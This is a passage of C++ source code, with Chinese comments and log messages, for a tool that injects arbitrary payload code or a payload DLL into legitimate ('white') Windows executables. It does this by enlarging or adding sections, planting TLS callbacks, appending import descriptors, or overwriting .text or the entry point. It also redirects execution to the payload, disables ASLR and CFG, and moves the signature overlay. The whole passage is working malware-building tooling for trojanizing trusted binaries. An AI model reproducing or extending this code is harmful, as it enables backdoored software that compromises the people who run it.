        const size_t freeSpace = (firstRaw == 0xFFFFFFFFu ? whiteBuf.size() : firstRaw) - secTableEnd;
        if (freeSpace >= sizeof(IMAGE_SECTION_HEADER) && secTableEnd + sizeof(IMAGE_SECTION_HEADER) <= m.SizeOfHeaders()) {
            outAvail.canAddNewSection = true;
        }
    }

    // 模式 4: TLS 回调（基于末节扩容，始终可用）
    outAvail.canTlsCallback = (m.SectionCount() > 0);

    // 模式 5: 导入表注入（要求载荷是 .dll 文件）
    std::wstring ext = std::filesystem::path(payloadPath).extension().wstring();
    for (auto& c : ext) c = towlower(c);
    outAvail.canImportInjection = (ext == L".dll");

    return true;
}

bool PePatcher::ExtractTextSection(const std::wstring& sourcePePath, std::vector<uint8_t>& outData) {
    std::vector<uint8_t> buffer;
    if (!ReadBinaryFile(sourcePePath, buffer)) {
        return false;
    }

    PeFileInfo info;
    if (!InspectPe(sourcePePath, info)) {
        return false;
    }

    if (info.textSectionOffset == 0 || info.textSectionSize == 0) {
        Log(CUI::LogLevel::Error, "PE", "源 PE 文件中未找到 .text 代码节");
        return false;
    }

    if (info.textSectionOffset + info.textSectionSize > buffer.size()) {
        Log(CUI::LogLevel::Error, "PE", ".text 节偏移超出文件边界");
        return false;
    }

    outData.assign(
        buffer.begin() + info.textSectionOffset,
        buffer.begin() + info.textSectionOffset + info.textSectionSize
    );
    Log(CUI::LogLevel::Success, "PE", std::format("提取 .text 代码段成功，尺寸: {} 字节 (0x{:X})", outData.size(), outData.size()));
    return true;
}

// 定位占据文件末尾的节并扩容，返回可安全写入的文件偏移与对应 RVA
bool PePatcher::ExpandLastSection(std::vector<uint8_t>& buf, size_t neededBytes,
                                  uint32_t& outAppendFileOffset, uint32_t& outAppendRVA, DWORD extraCharacteristics) {
    outAppendFileOffset = 0;
    outAppendRVA = 0;
    PeMap m;
    if (!MapPeBuffer(buf, m) || m.SectionCount() == 0) {
        Log(CUI::LogLevel::Error, "Patch", "PE 结构解析失败，无法扩容末尾节");
        return false;
    }
    IMAGE_SECTION_HEADER* last = m.LastFileSection();
    if (last->PointerToRawData == 0 || last->SizeOfRawData == 0) {
        Log(CUI::LogLevel::Error, "Patch", "末节没有原始数据，无法扩容");
        return false;
    }
    const uint32_t secAlign = m.SectionAlignment();
    const uint32_t fileAlign = m.FileAlignment();
    if (secAlign == 0 || fileAlign == 0) {
        Log(CUI::LogLevel::Error, "Patch", "无效的 PE 对齐参数");
        return false;
    }

    // 写入位置：旧原始数据末尾 (SizeOfRawData 已按 FileAlignment 对齐)
    outAppendFileOffset = last->PointerToRawData + last->SizeOfRawData;
    outAppendRVA = last->VirtualAddress + last->SizeOfRawData;

    const uint32_t oldRawSize = last->SizeOfRawData;
    const uint32_t oldVirtSize = last->Misc.VirtualSize;
    const uint32_t oldSizeOfImage = m.SizeOfImage();

    // 核心修正: 虚拟空间必须能覆盖到追加数据的末尾 (防止 oldVirtSize < oldRawSize 引起越界访问崩溃)
    const uint32_t currentSpan = (std::max)(oldVirtSize, oldRawSize);
    const uint32_t newRawSize = AlignUp(oldRawSize + static_cast<uint32_t>(neededBytes), fileAlign);
    const uint32_t newVirtSize = AlignUp(currentSpan + static_cast<uint32_t>(neededBytes), secAlign);
    const uint32_t newSizeOfImage = (std::max)(oldSizeOfImage,
        AlignUp(last->VirtualAddress + newVirtSize, secAlign));

    // 注意: 以下写入全部在 resize 之前完成，resize 可能导致 vector 重新分配而使 PeMap 指针失效
    last->Misc.VirtualSize = newVirtSize;
    last->SizeOfRawData = newRawSize;
    last->Characteristics |= extraCharacteristics;
    m.SetSizeOfImage(newSizeOfImage);

    const size_t newFileSize = static_cast<size_t>(last->PointerToRawData) + newRawSize;
    if (buf.size() < newFileSize) {
        buf.resize(newFileSize, 0);
    }
    Log(CUI::LogLevel::Info, "Patch", std::format(
        "已扩容末节: RawSize 0x{:X} -> 0x{:X}, VirtualSize 0x{:X} -> 0x{:X}, SizeOfImage 0x{:X} -> 0x{:X}",
        oldRawSize, newRawSize, oldVirtSize, newVirtSize, oldSizeOfImage, newSizeOfImage));
    return true;
}

bool PePatcher::DetachSecurityDirectory(std::vector<uint8_t>& buf, std::vector<uint8_t>& certOut) {
    certOut.clear();
    PeMap m;
    if (!MapPeBuffer(buf, m)) {
        return true;
    }
    IMAGE_DATA_DIRECTORY* sec = m.DataDir(IMAGE_DIRECTORY_ENTRY_SECURITY);
    if (sec->VirtualAddress == 0 || sec->Size == 0) {
        return true;
    }
    const uint32_t certOff = sec->VirtualAddress;
    const uint32_t certSize = sec->Size;
    if (certOff >= buf.size() || certSize > buf.size() - certOff) {
        Log(CUI::LogLevel::Warn, "Patch", "签名 Overlay 超出文件范围，已忽略");
        sec->VirtualAddress = 0;
        sec->Size = 0;
        return true;
    }
    certOut.assign(buf.begin() + certOff, buf.begin() + certOff + certSize);
    
    // 关键修正: 若签名位于文件尾部，直接截断 buffer，避免留下死区影响新增节或末节扩容
    if (certOff + certSize == buf.size()) {
        buf.resize(certOff);
    } else {
        std::memset(buf.data() + certOff, 0, certSize);
    }

    sec->VirtualAddress = 0;
    sec->Size = 0;
    Log(CUI::LogLevel::Info, "Patch", std::format(
        "检测到签名 Overlay (偏移 0x{:X}, {} 字节)，已摘除并将在写出时挂回文件末尾", certOff, certSize));
    return true;
}

bool PePatcher::AttachSecurityDirectory(std::vector<uint8_t>& buf, const std::vector<uint8_t>& certIn) {
    if (certIn.empty()) {
        return true;
    }
    // 先扩容再映射: resize 可能使 vector 重新分配，任何 map 指针都必须在 resize 之后获取
    const uint32_t certOff = AlignUp(static_cast<uint32_t>(buf.size()), 8);
    buf.resize(static_cast<size_t>(certOff) + certIn.size(), 0);
    std::memcpy(buf.data() + certOff, certIn.data(), certIn.size());

    PeMap m;
    if (!MapPeBuffer(buf, m)) {
        Log(CUI::LogLevel::Warn, "Patch", "无法挂回签名 Overlay (PE 结构解析失败)");
        return true;
    }
    IMAGE_DATA_DIRECTORY* sec = m.DataDir(IMAGE_DIRECTORY_ENTRY_SECURITY);
    sec->VirtualAddress = certOff;
    sec->Size = static_cast<uint32_t>(certIn.size());
    Log(CUI::LogLevel::Info, "Patch", std::format(
        "签名 Overlay 已迁移至文件末尾 (偏移 0x{:X}, {} 字节)", certOff, certIn.size()));
    return true;
}

// 模式 1: 扩容末尾节并追加载荷，入口点直接指向载荷
bool PePatcher::InjectByEnlargeLastSection(std::vector<uint8_t>& buf, const std::vector<uint8_t>& payload) {
    uint32_t appendOff = 0;
    uint32_t appendRVA = 0;
    const DWORD chars = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;
    if (!ExpandLastSection(buf, payload.size(), appendOff, appendRVA, chars)) {
        return false;
    }

    std::memcpy(buf.data() + appendOff, payload.data(), payload.size());

    PeMap m2;
    if (!MapPeBuffer(buf, m2)) {
        Log(CUI::LogLevel::Error, "Patch", "末节扩容后 PE 结构解析失败");
        return false;
    }
    m2.SetEntryPoint(appendRVA);
    DisableAslrAndCfg(m2, true);

    Log(CUI::LogLevel::Success, "Patch", std::format(
        "载荷已成功追加至末节 (文件偏移 0x{:X}，RVA 0x{:X})，入口点已直接重定向至载荷",
        appendOff, appendRVA));
    return true;
}

// 模式 2: 追加新节头 + 末尾数据，入口点直接指向新节
bool PePatcher::InjectByNewSection(std::vector<uint8_t>& buf, const std::vector<uint8_t>& payload) {
    PeMap m;
    if (!MapPeBuffer(buf, m) || m.SectionCount() == 0) {
        Log(CUI::LogLevel::Error, "Patch", "PE 结构解析失败，无法新增节");
        return false;
    }
    const WORD nsec = m.SectionCount();
    if (nsec >= 96) {
        Log(CUI::LogLevel::Error, "Patch", "节数量已达上限，无法新增节");
        return false;
    }

    // 节表末尾与首个节实体之间必须有足够空间容纳新节头 (40 字节)
    uint32_t firstRaw = 0xFFFFFFFFu;
    for (WORD i = 0; i < nsec; ++i) {
        if (m.sections[i].PointerToRawData != 0) {
            firstRaw = (std::min)(firstRaw, static_cast<uint32_t>(m.sections[i].PointerToRawData));
        }
    }
    const size_t secTableEnd = reinterpret_cast<const uint8_t*>(&m.sections[nsec]) - buf.data();
    if (secTableEnd > buf.size()) {
        Log(CUI::LogLevel::Error, "Patch", "节表超出文件范围");
        return false;
    }
    const size_t freeSpace = (firstRaw == 0xFFFFFFFFu ? buf.size() : firstRaw) - secTableEnd;
    if (freeSpace < sizeof(IMAGE_SECTION_HEADER)) {
        Log(CUI::LogLevel::Error, "Patch", std::format(
            "节表后空闲空间不足 (需要 {} 字节，仅 {} 字节)，无法新增节头，可改用扩容末节模式",
            sizeof(IMAGE_SECTION_HEADER), freeSpace));
        return false;
    }
    if (secTableEnd + sizeof(IMAGE_SECTION_HEADER) > m.SizeOfHeaders()) {
        Log(CUI::LogLevel::Error, "Patch", "节表超出 SizeOfHeaders 限制，无法新增节头，可改用扩容末节模式");
        return false;
    }

    const uint32_t secAlign = m.SectionAlignment();
    const uint32_t fileAlign = m.FileAlignment();
    uint32_t maxEndRVA = 0;
    for (WORD i = 0; i < nsec; ++i) {
        const IMAGE_SECTION_HEADER* s = &m.sections[i];
        maxEndRVA = (std::max)(maxEndRVA,
            AlignUp(s->VirtualAddress + (std::max)(s->Misc.VirtualSize, s->SizeOfRawData), secAlign));
    }

    IMAGE_SECTION_HEADER* ns = &m.sections[nsec];
    const uint32_t newSectionVA = maxEndRVA;
    const uint32_t newSectionRawOff = AlignUp(static_cast<uint32_t>(buf.size()), fileAlign);
    const uint32_t newSectionRawSize = AlignUp(static_cast<uint32_t>(payload.size()), fileAlign);

    std::memset(ns, 0, sizeof(IMAGE_SECTION_HEADER));
    std::memcpy(ns->Name, ".patch", sizeof(".patch") - 1);
    ns->VirtualAddress = newSectionVA;
    ns->Misc.VirtualSize = static_cast<uint32_t>(payload.size());
    ns->SizeOfRawData = newSectionRawSize;
    ns->PointerToRawData = newSectionRawOff;
    ns->Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;

    m.fileHeader->NumberOfSections = static_cast<WORD>(nsec + 1);
    m.SetSizeOfImage((std::max)(m.SizeOfImage(),
        AlignUp(newSectionVA + AlignUp(static_cast<uint32_t>(payload.size()), secAlign), secAlign)));

    const size_t newFileSize = static_cast<size_t>(newSectionRawOff) + newSectionRawSize;
    buf.resize(newFileSize, 0);
    std::memcpy(buf.data() + newSectionRawOff, payload.data(), payload.size());

    // resize 后重新映射再写入口点并解除 ASLR/CFG
    PeMap m2;
    if (!MapPeBuffer(buf, m2)) {
        Log(CUI::LogLevel::Error, "Patch", "新增节后 PE 结构解析失败");
        return false;
    }
    m2.SetEntryPoint(newSectionVA);
    DisableAslrAndCfg(m2, true);

    Log(CUI::LogLevel::Success, "Patch", std::format(
        "新节 .patch 已建立 (RVA 0x{:X}，文件偏移 0x{:X})，入口点已直接重定向至新节",
        newSectionVA, newSectionRawOff));
    return true;
}

// 模式 3: 构建 TLS 目录与回调数组，入口点保持不变，系统加载器直接执行载荷
bool PePatcher::InjectByTlsCallback(std::vector<uint8_t>& buf, const std::vector<uint8_t>& payload) {
    PeMap m;
    if (!MapPeBuffer(buf, m)) {
        Log(CUI::LogLevel::Error, "Patch", "PE 结构解析失败，无法注入 TLS 回调");
        return false;
    }
    IMAGE_DATA_DIRECTORY* tlsDir = m.DataDir(IMAGE_DIRECTORY_ENTRY_TLS);
    const bool hadTls = (tlsDir->VirtualAddress != 0);
    if (hadTls) {
        Log(CUI::LogLevel::Warn, "Patch", std::format(
            "白文件已存在 TLS 目录 (RVA 0x{:X})，将强制覆盖为新构造的回调目录", tlsDir->VirtualAddress));
    }
    const bool is64 = m.is64;
    const uint32_t ptrSize = is64 ? 8 : 4;
    const uint32_t tlsStructSize = is64 ? sizeof(IMAGE_TLS_DIRECTORY64) : sizeof(IMAGE_TLS_DIRECTORY32);
    const size_t stubSize = is64 ? 225 : 167; // BuildTlsWrapper 生成的跳板尺寸
    const size_t oepStubSize = 2;              // 0xEB, 0xFE (jmp $) 主线程防崩存活指令

    // 布局: [TLS 目录][对齐填充][回调数组: 2个指针][TLS 索引变量: ptrSize 字节][RunFlag 变量: 4 字节][TLS 异步跳板 Stub][OEP 存活 Stub: 2 字节][载荷代码]
    const size_t needed = AlignUp(tlsStructSize, 16) + 2 * ptrSize + ptrSize + 4 + 16 +
                         AlignUp(stubSize, 16) + AlignUp(oepStubSize, 16) + payload.size() + 64;
    uint32_t baseOff = 0;
    uint32_t baseRVA = 0;
    // WRITE: AddressOfIndex 由加载器写入索引值，所在节必须可写
    const DWORD chars = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;
    if (!ExpandLastSection(buf, needed, baseOff, baseRVA, chars)) {
        return false;
    }

    const uint32_t dirOff = baseOff;
    const uint32_t cbArrOff = AlignUp(dirOff + tlsStructSize, 16);
    const uint32_t indexOff = cbArrOff + 2 * ptrSize;
    const uint32_t flagOff = indexOff + ptrSize;
    const uint32_t stubOff = AlignUp(flagOff + 4, 16);
    const uint32_t oepOff = AlignUp(stubOff + static_cast<uint32_t>(stubSize), 16);
    const uint32_t payOff = AlignUp(oepOff + static_cast<uint32_t>(oepStubSize), 16);

    const uint32_t dirRVA = baseRVA + (dirOff - baseOff);
    const uint32_t cbArrRVA = baseRVA + (cbArrOff - baseOff);
    const uint32_t idxRVA = baseRVA + (indexOff - baseOff);
    const uint32_t flagRVA = baseRVA + (flagOff - baseOff);
    const uint32_t stubRVA = baseRVA + (stubOff - baseOff);
    const uint32_t oepRVA = baseRVA + (oepOff - baseOff);
    const uint32_t payRVA = baseRVA + (payOff - baseOff);

    // ExpandLastSection 重新分配了 buffer，重新映射
    PeMap m2;
    if (!MapPeBuffer(buf, m2)) {
        Log(CUI::LogLevel::Error, "Patch", "TLS 注入后 PE 结构解析失败");
        return false;
    }

    DisableAslrAndCfg(m2, false);
    const uint64_t imageBase = m2.ImageBase();

    // 构造异步拉起跳板 Stub
    auto tlsStub = BuildTlsWrapper(is64, stubRVA, payRVA, flagRVA, imageBase);

    // 重设入口点到安全存活点，避免加载器执行原宿主受损代码崩溃
    m2.SetEntryPoint(oepRVA);

    if (is64) {
        auto* dir = reinterpret_cast<IMAGE_TLS_DIRECTORY64*>(buf.data() + dirOff);
        dir->StartAddressOfRawData = 0;
        dir->EndAddressOfRawData = 0;
        dir->AddressOfIndex = imageBase + idxRVA;
        dir->AddressOfCallBacks = imageBase + cbArrRVA;
        dir->SizeOfZeroFill = 0;
        dir->Characteristics = 0;
        auto* callbacks = reinterpret_cast<uint64_t*>(buf.data() + cbArrOff);
        callbacks[0] = imageBase + stubRVA; // 指向异步跳板 Stub
        callbacks[1] = 0;
    } else {
        auto* dir = reinterpret_cast<IMAGE_TLS_DIRECTORY32*>(buf.data() + dirOff);
        dir->StartAddressOfRawData = 0;
        dir->EndAddressOfRawData = 0;
        dir->AddressOfIndex = static_cast<DWORD>(imageBase + idxRVA);
        dir->AddressOfCallBacks = static_cast<DWORD>(imageBase + cbArrRVA);
        dir->SizeOfZeroFill = 0;
        dir->Characteristics = 0;
        auto* callbacks = reinterpret_cast<DWORD*>(buf.data() + cbArrOff);
        callbacks[0] = static_cast<DWORD>(imageBase + stubRVA); // 指向异步跳板 Stub
        callbacks[1] = 0;
    }

    std::memset(buf.data() + indexOff, 0, ptrSize);
    std::memset(buf.data() + flagOff, 0, 4);
    std::memcpy(buf.data() + stubOff, tlsStub.data(), tlsStub.size());
    buf[oepOff] = 0xEB; // jmp $ (防崩存活循环)
    buf[oepOff + 1] = 0xFE;
    std::memcpy(buf.data() + payOff, payload.data(), payload.size());

    IMAGE_DATA_DIRECTORY* tlsDir2 = m2.DataDir(IMAGE_DIRECTORY_ENTRY_TLS);
    tlsDir2->VirtualAddress = dirRVA;
    tlsDir2->Size = tlsStructSize;

    Log(CUI::LogLevel::Success, "Patch", std::format(
        "TLS 回调已注册{} (异步跳板 RVA 0x{:X}，载荷 RVA 0x{:X})",
        hadTls ? "，原 TLS 目录已被覆盖" : "", stubRVA, payRVA));
    return true;
}

// 模式 4: 追加导入描述符，让系统加载器在白文件启动时加载载荷 DLL
bool PePatcher::InjectByImportTable(std::vector<uint8_t>& buf, const std::wstring& payloadPath) {
    // 1. 读取载荷 DLL 并解析导出表，选取一个真实导出项
    std::vector<uint8_t> dll;
    if (!ReadBinaryFile(payloadPath, dll)) {
        Log(CUI::LogLevel::Error, "Import", "读取载荷 DLL 失败");
        return false;
    }
    PeMap dm;
    if (!MapPeBuffer(dll, dm)) {
        Log(CUI::LogLevel::Error, "Import", "载荷不是有效的 PE 文件 (导入表注入要求载荷为 DLL)");
        return false;
    }
    IMAGE_DATA_DIRECTORY* expDir = dm.DataDir(IMAGE_DIRECTORY_ENTRY_EXPORT);
    if (expDir->VirtualAddress == 0 || expDir->Size == 0) {
        Log(CUI::LogLevel::Error, "Import", "载荷 DLL 不包含导出表，无法生成导入项");
        return false;
    }
    const uint32_t expOff = RvaToOffset(dm, dll, expDir->VirtualAddress);
    if (expOff == 0 || expOff + sizeof(IMAGE_EXPORT_DIRECTORY) > dll.size()) {
        Log(CUI::LogLevel::Error, "Import", "载荷 DLL 导出表损坏");
        return false;
    }
    auto* exp = reinterpret_cast<const IMAGE_EXPORT_DIRECTORY*>(dll.data() + expOff);
    std::string funcName;
    uint32_t hint = 0;
    uint32_t ordinal = 0;
    bool byName = false;
    if (exp->NumberOfNames > 0) {
        const uint32_t namesOff = RvaToOffset(dm, dll, exp->AddressOfNames);
        if (namesOff == 0 || namesOff + sizeof(DWORD) > dll.size()) {
            Log(CUI::LogLevel::Error, "Import", "载荷 DLL 导出名称表损坏");
            return false;
        }
        const uint32_t nameRva = *reinterpret_cast<const DWORD*>(dll.data() + namesOff);
        const uint32_t ibnOff = RvaToOffset(dm, dll, nameRva);
        if (ibnOff == 0 || ibnOff + sizeof(IMAGE_IMPORT_BY_NAME) > dll.size()) {
            Log(CUI::LogLevel::Error, "Import", "载荷 DLL 导出名损坏");
            return false;
        }
        auto* ibn = reinterpret_cast<const IMAGE_IMPORT_BY_NAME*>(dll.data() + ibnOff);
        hint = ibn->Hint;
        funcName = reinterpret_cast<const char*>(ibn->Name);
        byName = true;
    } else if (exp->NumberOfFunctions > 0) {
        ordinal = exp->Base;
    } else {
        Log(CUI::LogLevel::Error, "Import", "载荷 DLL 没有任何导出函数，无法生成导入项");
        return false;
    }
    std::string dllName = WstrToUtf8(std::filesystem::path(payloadPath).filename().wstring());
    if (dllName.empty()) {
        dllName = "payload.dll";
    }

    // 2. 解析白文件现有导入描述符数量
    PeMap m;
    if (!MapPeBuffer(buf, m)) {
        Log(CUI::LogLevel::Error, "Import", "PE 结构解析失败，无法注入导入表");
        return false;
    }
    IMAGE_DATA_DIRECTORY* impDir = m.DataDir(IMAGE_DIRECTORY_ENTRY_IMPORT);
    uint32_t descCount = 0;
    if (impDir->VirtualAddress != 0 && impDir->Size >= sizeof(IMAGE_IMPORT_DESCRIPTOR)) {
        const uint32_t endRva = impDir->VirtualAddress + impDir->Size;
        for (uint32_t walkRva = impDir->VirtualAddress;
             walkRva + sizeof(IMAGE_IMPORT_DESCRIPTOR) <= endRva;
             walkRva += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {
            const uint32_t dOff = RvaToOffset(m, buf, walkRva);
            if (dOff == 0 || dOff + sizeof(IMAGE_IMPORT_DESCRIPTOR) > buf.size()) break;
            auto* d = reinterpret_cast<const IMAGE_IMPORT_DESCRIPTOR*>(buf.data() + dOff);
            if (d->Name == 0) break;
            ++descCount;
        }
        if (descCount == 0) {
            Log(CUI::LogLevel::Error, "Import", "现有导入表解析失败，无法注入");
            return false;
        }
    }

    // 3. 布局并扩容末节
    const bool is64 = m.is64;
    const uint32_t thunkSize = is64 ? 8 : 4;
    const size_t descBytes = (static_cast<size_t>(descCount) + 2) * sizeof(IMAGE_IMPORT_DESCRIPTOR);
    const size_t hintNameBytes = byName ? (2 + funcName.size() + 1) : 0;
    const size_t needed = descBytes + 4 * thunkSize + dllName.size() + 1 + hintNameBytes + 16;
    uint32_t baseOff = 0;
    uint32_t baseRVA = 0;
    const DWORD chars = IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;
    if (!ExpandLastSection(buf, needed, baseOff, baseRVA, chars)) {
        return false;
    }

    // 4. 依次布置: 描述符数组 / INT / FT / DLL 名 / Hint-Name
    // ExpandLastSection 内部 resize 过缓冲区，原 m/impDir 指针已失效，必须重新映射
    PeMap m2;
    if (!MapPeBuffer(buf, m2)) {
        Log(CUI::LogLevel::Error, "Import", "导入表注入后 PE 结构解析失败");
        return false;
    }
    const uint32_t descArrOff = baseOff;
    const uint32_t intArrOff = descArrOff + static_cast<uint32_t>(descBytes);
    const uint32_t ftArrOff = intArrOff + 2 * thunkSize;
    const uint32_t nameOff = ftArrOff + 2 * thunkSize;
    const uint32_t hintNameOff = AlignUp(nameOff + static_cast<uint32_t>(dllName.size()) + 1, 4);
    const uint32_t descArrRVA = baseRVA + (descArrOff - baseOff);
    const uint32_t intArrRVA = baseRVA + (intArrOff - baseOff);
    const uint32_t ftArrRVA = baseRVA + (ftArrOff - baseOff);
    const uint32_t nameRVA = baseRVA + (nameOff - baseOff);
    const uint32_t hintNameRVA = baseRVA + (hintNameOff - baseOff);

    // 5. 复制旧描述符，追加新描述符与全零终止符
    IMAGE_DATA_DIRECTORY* impDir2 = m2.DataDir(IMAGE_DIRECTORY_ENTRY_IMPORT);
    for (uint32_t i = 0; i < descCount; ++i) {
        const uint32_t srcOff = RvaToOffset(m2, buf, impDir2->VirtualAddress + i * sizeof(IMAGE_IMPORT_DESCRIPTOR));
        if (srcOff == 0) {
            Log(CUI::LogLevel::Error, "Import", "读取旧导入描述符失败");
            return false;
        }
        std::memcpy(buf.data() + descArrOff + i * sizeof(IMAGE_IMPORT_DESCRIPTOR),
                    buf.data() + srcOff, sizeof(IMAGE_IMPORT_DESCRIPTOR));
    }
    auto* newDesc = reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR*>(
        buf.data() + descArrOff + descCount * sizeof(IMAGE_IMPORT_DESCRIPTOR));
    std::memset(newDesc, 0, sizeof(IMAGE_IMPORT_DESCRIPTOR));
    newDesc->OriginalFirstThunk = intArrRVA;
    newDesc->TimeDateStamp = 0;
    newDesc->ForwarderChain = 0;
    newDesc->Name = nameRVA;
    newDesc->FirstThunk = ftArrRVA;
    std::memset(buf.data() + descArrOff + (descCount + 1) * sizeof(IMAGE_IMPORT_DESCRIPTOR),
                0, sizeof(IMAGE_IMPORT_DESCRIPTOR));

    // 6. INT/FT 各写一条 Thunk + 终止符
    const uint64_t thunkValue = byName
        ? static_cast<uint64_t>(hintNameRVA)
        : (is64 ? (IMAGE_ORDINAL_FLAG64 | ordinal) : (IMAGE_ORDINAL_FLAG32 | ordinal));
    for (int which = 0; which < 2; ++which) {
        uint8_t* arrBase = buf.data() + (which == 0 ? intArrOff : ftArrOff);
        if (is64) {
            auto* thunk = reinterpret_cast<uint64_t*>(arrBase);
            thunk[0] = thunkValue;
            thunk[1] = 0;
        } else {
            auto* thunk = reinterpret_cast<DWORD*>(arrBase);
            thunk[0] = static_cast<DWORD>(thunkValue);
            thunk[1] = 0;
        }
    }

    // 7. DLL 名称与 Hint/Name
    std::memcpy(buf.data() + nameOff, dllName.c_str(), dllName.size() + 1);
    if (byName) {
        auto* ibn = reinterpret_cast<IMAGE_IMPORT_BY_NAME*>(buf.data() + hintNameOff);
        ibn->Hint = static_cast<WORD>(hint);
        std::memcpy(ibn->Name, funcName.c_str(), funcName.size() + 1);
    }

    // 8. 重定向导入目录
    impDir2->VirtualAddress = descArrRVA;
    impDir2->Size = static_cast<DWORD>(descBytes);

    Log(CUI::LogLevel::Success, "Import", std::format(
        "导入表已注入: {} ! {} ({})，白文件启动时将由系统加载器自动加载载荷 DLL",
        dllName, byName ? funcName : ("Ordinal#" + std::to_string(ordinal)), is64 ? "x64" : "x86"));
    return true;
}

bool PePatcher::ExecutePatch(
    const std::wstring& whitePePath,
    const std::wstring& payloadPath,
    const std::wstring& outputPath,
    PatchMode mode,
    bool removeSignature
) {
    Log(CUI::LogLevel::Info, "Patch", "================== 开始执行 Patch 流程 ==================");
    Log(CUI::LogLevel::Info, "Patch", "目标白文件: " + WstrToUtf8(whitePePath));
    Log(CUI::LogLevel::Info, "Patch", "注入载荷: " + WstrToUtf8(payloadPath));

    // 1. 读取并验证目标白文件
    std::vector<uint8_t> whiteBuffer;
    if (!ReadBinaryFile(whitePePath, whiteBuffer)) {
        Log(CUI::LogLevel::Error, "Patch", "读取目标白文件失败");
        return false;
    }

    PeFileInfo whiteInfo;
    if (!InspectPe(whitePePath, whiteInfo)) {
        Log(CUI::LogLevel::Error, "Patch", "目标白文件 PE 结构校验失败");
        return false;
    }

    Log(CUI::LogLevel::Info, "PE", std::format(
        "白文件架构: {}, ImageBase: 0x{:X}, EntryPoint RVA: 0x{:X} (VA: 0x{:X})",
        whiteInfo.is64Bit ? "x64 (64-bit)" : "x86 (32-bit)",
        whiteInfo.imageBase, whiteInfo.entryPointRva, whiteInfo.entryPointVa
    ));

    // 2. 准备载荷数据（导入表注入不嵌入载荷，仅引用其导出函数）
    std::vector<uint8_t> payloadData;
    if (mode != PatchMode::ImportInjection) {
        std::wstring ext = std::filesystem::path(payloadPath).extension().wstring();
        for (auto& c : ext) c = towlower(c);

        if (ext == L".exe" || ext == L".dll") {
            Log(CUI::LogLevel::Info, "Payload", "输入载荷为可执行文件，正在解析并提取其 .text 代码段...");
            if (!ExtractTextSection(payloadPath, payloadData)) {
                Log(CUI::LogLevel::Error, "Payload", "提取载荷代码段失败");
                return false;
            }
        } else {
            Log(CUI::LogLevel::Info, "Payload", "输入载荷为原始二进制数据 (.bin / .text)...");
            if (!ReadBinaryFile(payloadPath, payloadData)) {
                Log(CUI::LogLevel::Error, "Payload", "读取载荷二进制数据失败");
                return false;
            }
        }

        if (payloadData.empty()) {
            Log(CUI::LogLevel::Error, "Payload", "载荷数据为空，终止操作");
            return false;
        }
        Log(CUI::LogLevel::Info, "Payload", std::format("载荷大小: {} 字节", payloadData.size()));
    } else {
        Log(CUI::LogLevel::Info, "Patch", "模式: 导入表注入，载荷 DLL 不会被嵌入，需随主程序一同分发");
    }

    // 3. 按模式执行注入
    if (mode == PatchMode::ReplaceTextSection || mode == PatchMode::InjectEntryPoint) {
        // 就地覆盖类模式: 计算 .text 或入口点位置后直接覆盖
        size_t targetOffset = 0;
        uint32_t newOepRva = 0;
        if (mode == PatchMode::ReplaceTextSection) {
            if (whiteInfo.textSectionOffset == 0) {
                Log(CUI::LogLevel::Error, "Patch", "白文件中不存在 .text 节，无法执行代码段替换");
                return false;
            }
            targetOffset = whiteInfo.textSectionOffset;
            Log(CUI::LogLevel::Info, "Patch", std::format("模式: .text 代码段覆盖，目标文件偏移: 0x{:X}，白文件段容积: {} 字节",
                targetOffset, whiteInfo.textSectionSize));

            if (payloadData.size() > whiteInfo.textSectionSize) {
                Log(CUI::LogLevel::Warn, "Patch", std::format(
                    "载荷大小 ({} 字节) 超出白文件 .text 原段大小 ({} 字节)，将截断或可能引起节重叠",
                    payloadData.size(), whiteInfo.textSectionSize));
            }

            // 查找 .text 节的 RVA 并确保其为入口点
            PeMap m;
            if (MapPeBuffer(whiteBuffer, m)) {
                for (WORD i = 0; i < m.SectionCount(); ++i) {
                    if (strncmp(reinterpret_cast<const char*>(m.sections[i].Name), ".text", 5) == 0) {
                        newOepRva = m.sections[i].VirtualAddress;
                        m.sections[i].Characteristics |= (IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE);
                        break;
                    }
                }
            }
        } else {
            // 入口点注入模式
            auto* dosHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(whiteBuffer.data());
            auto* fileHeader = reinterpret_cast<IMAGE_FILE_HEADER*>(whiteBuffer.data() + dosHeader->e_lfanew + sizeof(DWORD));
            IMAGE_SECTION_HEADER* firstSection = reinterpret_cast<IMAGE_SECTION_HEADER*>(
                whiteBuffer.data() + dosHeader->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + fileHeader->SizeOfOptionalHeader
            );

            bool foundSec = false;
            for (DWORD i = 0; i < fileHeader->NumberOfSections; ++i) {
                IMAGE_SECTION_HEADER* sec = &firstSection[i];
                if (whiteInfo.entryPointRva >= sec->VirtualAddress &&
                    whiteInfo.entryPointRva < sec->VirtualAddress + sec->SizeOfRawData) {
                    targetOffset = (whiteInfo.entryPointRva - sec->VirtualAddress) + sec->PointerToRawData;
                    sec->Characteristics |= (IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE);
                    foundSec = true;
                    break;
                }
            }

            if (!foundSec) {
                Log(CUI::LogLevel::Error, "Patch", "无法将 EntryPoint RVA 映射到文件偏移");
                return false;
            }
            Log(CUI::LogLevel::Info, "Patch", std::format("模式: 入口点注入，EntryPoint 文件偏移: 0x{:X}", targetOffset));
        }

        if (targetOffset + payloadData.size() > whiteBuffer.size()) {
            // 扩容白文件缓冲区
            whiteBuffer.resize(targetOffset + payloadData.size());
        }
        std::memcpy(whiteBuffer.data() + targetOffset, payloadData.data(), payloadData.size());

        // 统一更新 PE 属性：设置入口点、禁用 ASLR/CFG、清理残留 TLS、解决 ImageBase 冲突
        PeMap m2;
        if (MapPeBuffer(whiteBuffer, m2)) {
            if (newOepRva != 0) {
